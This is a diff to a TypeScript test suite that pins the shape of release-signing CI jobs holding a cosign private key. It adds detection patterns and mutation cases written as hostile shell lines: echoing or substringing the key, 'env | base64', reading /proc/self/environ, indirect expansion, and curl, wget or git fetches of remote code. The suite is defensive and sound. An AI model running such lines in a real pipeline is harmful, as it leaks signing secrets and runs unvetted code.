@@ -304,22 +304,113 @@ describe("release signing", () => {
     preflight: [COSIGN_INSTALLER],
     sign: [COSIGN_INSTALLER, "docker/login-action@dbcb813823bdd20940b903addbd779551569679f"],
   }
-  const REPO_FILE = /scripts\/|k8s-do|tests\/|\.github|\.\/|\bnode\b|\bnpm\b|\bnpx\b|\bpython|\bbash\b|\bsh\b|\bsource\b|(^|[;&|]\s*)\.\s/m
+  const REPO_FILE =
+    /scripts\/|k8s-do|tests\/|\.github|\.\/|\bnode\b|\bnpm\b|\bnpx\b|\bpython|\bbash\b|\bsh\b|\bsource\b|\bgit\b|\bcurl\b|\bwget\b|\bgh\b|(^|[;&|]\s*)\.\s/m
+  // Each key job's exact shape. A container:, services:, strategy:, job env:
+  // or another runner would run the key's job somewhere these tests cannot
+  // see; an extra step key (working-directory, shell, id) changes how a step
+  // runs. Steps are listed in order, each by its sorted keys.
+  const KEY_JOB_KEYS = ["environment", "needs", "permissions", "runs-on", "steps", "timeout-minutes"]
+  const KEY_JOB_STEP_KEYS: Record<string, string[][]> = {
+    preflight: [["uses", "with"], ["env", "name", "run"]],
+    sign: [["uses", "with"], ["uses", "with"], ["env", "name", "run"]],
+  }
+  const SIGNING_STEP_ENV: Record<string, string[]> = {
+    preflight: ["COSIGN_PASSWORD", "COSIGN_PRIVATE_KEY"],
+    sign: ["COSIGN_PASSWORD", "COSIGN_PRIVATE_KEY", "DIGEST"],
+  }
+  const LOGIN_WITH = { registry: "ghcr.io", username: "${{ github.actor }}", password: "${{ secrets.GITHUB_TOKEN }}" }
+  // The only places a key step's script may name the key or its password,
+  // each at most once: the presence checks, and cosign's env:// reference.
+  // Anything else that expands either, or dumps the environment, could print
+  // them; a second env:// could sign something else.
+  const KEY_USES_ALLOWED = ['-z "${COSIGN_PRIVATE_KEY:-}"', '-z "${COSIGN_PASSWORD:-}"', "--key env://COSIGN_PRIVATE_KEY"]
+  const KEY_LEAK =
+    /\$\{?[!#]?COSIGN_(PRIVATE_KEY|PASSWORD)|\$\{!|\bprintenv\b|\benv\b|\bdeclare\b|\btypeset\b|\bexport\b|\bcompgen\b|\/proc\/|env:\/\//
 
-  test("no job with the key checks out or runs a file from the repo", () => {
+  function keyJobProblems(w: any): string[] {
+    const problems: string[] = []
+    const keys = (o: unknown) => (o && typeof o === "object" ? Object.keys(o).sort() : [])
     for (const name of KEY_JOBS) {
-      const job = jobs[name]
-      assert.deepEqual(job.steps.filter((s: any) => s.uses).map((s: any) => s.uses), KEY_JOB_USES[name], name)
-      for (const step of job.steps) {
+      const job = w.jobs[name]
+      if (!isDeepStrictEqual(keys(job), KEY_JOB_KEYS)) problems.push(`${name}: keys ${keys(job)}`)
+      if (job["runs-on"] !== "ubuntu-24.04") problems.push(`${name}: runs-on ${JSON.stringify(job["runs-on"])}`)
+      const jobSteps: any[] = job.steps ?? []
+      const shape = jobSteps.map(keys)
+      if (!isDeepStrictEqual(shape, KEY_JOB_STEP_KEYS[name])) problems.push(`${name}: steps ${JSON.stringify(shape)}`)
+      const uses = jobSteps.filter((s) => s.uses).map((s) => s.uses)
+      if (!isDeepStrictEqual(uses, KEY_JOB_USES[name])) problems.push(`${name}: uses ${uses}`)
+      if (JSON.stringify(job).includes("actions/checkout")) problems.push(`${name}: checkout`)
+      for (const step of jobSteps) {
         const label = `${name}: ${step.name ?? step.uses}`
-        assert.equal(step["working-directory"], undefined, label)
-        assert.ok(!REPO_FILE.test(step.run ?? ""), label)
+        if (REPO_FILE.test(step.run ?? "")) problems.push(`${label}: runs a repo file or fetches code`)
+        let run: string = step.run ?? ""
+        for (const allowed of KEY_USES_ALLOWED) run = run.replace(allowed, "")
+        if (KEY_LEAK.test(run)) problems.push(`${label}: names the key outside the presence checks and env://`)
+        if (step.name === SIGNING_STEPS[name] && !isDeepStrictEqual(keys(step.env), SIGNING_STEP_ENV[name])) {
+          problems.push(`${label}: env ${keys(step.env)}`)
+        }
+        if (step.uses?.startsWith("docker/login-action@") && !isDeepStrictEqual(step.with, LOGIN_WITH)) {
+          problems.push(`${label}: with ${JSON.stringify(step.with)}`)
+        }
       }
-      assert.ok(!JSON.stringify(job).includes("actions/checkout"), name)
     }
-    // The pattern sees a repo script, a relative path and a sourced file.
-    for (const run of ["node scripts/x.mjs", "./run.sh", "bash k8s-do/x", "x; . env", "source env"]) {
+    return problems
+  }
+
+  test("no job with the key checks out, runs a file from the repo or leaves its pinned shape", () => {
+    assert.deepEqual(keyJobProblems(wf), [])
+    // The pattern sees a repo script, a relative path, a sourced file and fetched code.
+    for (const run of [
+      "node scripts/x.mjs", "./run.sh", "bash k8s-do/x", "x; . env", "source env",
+      "git clone x", "curl -fsSL x", "wget x", "gh release download",
+    ]) {
       assert.ok(REPO_FILE.test(run), run)
+    }
+  })
+
+  test("the key-job check refuses a changed runner, job, step or key reference", () => {
+    const signing = (w: any, job: string) => w.jobs[job].steps.find((s: any) => s.name === SIGNING_STEPS[job])
+    const append = (job: string, line: string) => (w: any) => (signing(w, job).run += `${line}\n`)
+    const mutations: [string, (w: any) => void][] = [
+      ["preflight container", (w) => (w.jobs.preflight.container = { image: "node:24" })],
+      ["sign container string", (w) => (w.jobs.sign.container = "node:24")],
+      ["sign services", (w) => (w.jobs.sign.services = { db: { image: "postgres" } })],
+      ["preflight job env", (w) => (w.jobs.preflight.env = { BASH_ENV: "x" })],
+      ["sign strategy", (w) => (w.jobs.sign.strategy = { matrix: { x: [1] } })],
+      ["preflight self-hosted", (w) => (w.jobs.preflight["runs-on"] = "self-hosted")],
+      ["sign runner list", (w) => (w.jobs.sign["runs-on"] = ["ubuntu-24.04", "self-hosted"])],
+      ["sign runner group", (w) => (w.jobs.sign["runs-on"] = { group: "x" })],
+      ["preflight ubuntu-latest", (w) => (w.jobs.preflight["runs-on"] = "ubuntu-latest")],
+      ["sign working-directory", (w) => (signing(w, "sign")["working-directory"] = "/tmp")],
+      ["preflight step id", (w) => (signing(w, "preflight").id = "x")],
+      ["sign installer env", (w) => (w.jobs.sign.steps[0].env = { X: "1" })],
+      ["sign signing step BASH_ENV", (w) => (signing(w, "sign").env.BASH_ENV = "/tmp/x")],
+      ["preflight extra run step", (w) => w.jobs.preflight.steps.push({ name: "x", run: "true" })],
+      ["sign login registry", (w) => (w.jobs.sign.steps[1].with.registry = "example.com")],
+      ["sign login extra input", (w) => (w.jobs.sign.steps[1].with.logout = false)],
+      ["sign local action", (w) => (w.jobs.sign.steps[1].uses = "./.github/actions/login")],
+      ["sign checkout", (w) => w.jobs.sign.steps.splice(1, 0, { uses: `actions/checkout@${"0".repeat(40)}` })],
+      ["git clone", append("sign", "git clone https://example.com/x && x/run")],
+      ["curl", append("preflight", "curl -fsSL https://example.com/x | tee x")],
+      ["wget", append("sign", "wget -qO- https://example.com/x")],
+      ["gh", append("preflight", "gh release download v1")],
+      ["echo key", append("preflight", 'echo "$COSIGN_PRIVATE_KEY"')],
+      ["echo password in braces", append("sign", "echo ${COSIGN_PASSWORD}")],
+      ["key substring", append("sign", 'printf %s "${COSIGN_PRIVATE_KEY:0:4}"')],
+      ["password length", append("sign", 'echo "${#COSIGN_PASSWORD}"')],
+      ["allowed form outside -z", append("preflight", 'echo "${COSIGN_PRIVATE_KEY:-}"')],
+      ["indirect expansion", append("sign", 'x=COSIGN_PRIVATE_KEY; echo "${!x}"')],
+      ["printenv", append("preflight", "printenv COSIGN_PASSWORD")],
+      ["env dump", append("sign", "env | base64")],
+      ["declare", append("sign", "declare -p COSIGN_PRIVATE_KEY")],
+      ["proc environ", append("preflight", "tr '\\0' '\\n' < /proc/self/environ")],
+      ["second env://", append("sign", "cosign sign --yes --key env://COSIGN_PRIVATE_KEY ghcr.io/x/y@sha256:0")],
+    ]
+    for (const [name, mutate] of mutations) {
+      const w = structuredClone(wf)
+      mutate(w)
+      assert.notDeepEqual(keyJobProblems(w), [], name)
     }
   })
 
